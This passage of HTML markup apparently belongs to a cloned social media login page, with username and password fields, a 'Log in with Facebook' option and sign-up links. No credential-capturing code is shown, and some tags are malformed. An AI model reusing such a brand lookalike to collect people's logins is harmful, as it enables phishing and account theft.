                    <input id="username" type="name" placeholder="Phone number, username, or email" />

                </div>
                <div class="field">
                    <input id="password" type="password" placeholder="password" />
                    <label for="password">Password</label>
                </div>

                <div class="separator">

                    <p>OR</p>
                    <div class="line"></div>
                </div>
                <div class="other">

                        <i class="fa fa-facebook-official fb-icon"></i>
                        <span class=""><link rel="stylesheet" href="https://web.facebook.com/?_rdc=1&_rdr">Log in with Facebook</span>
                    </button>
                    <a class="forgot-password" href="#">Forgot password?</a>
                </div>
            </form>
        </div>

            <p>Don't have an account? <a class="signup" href="#">Sign Up</a></p>
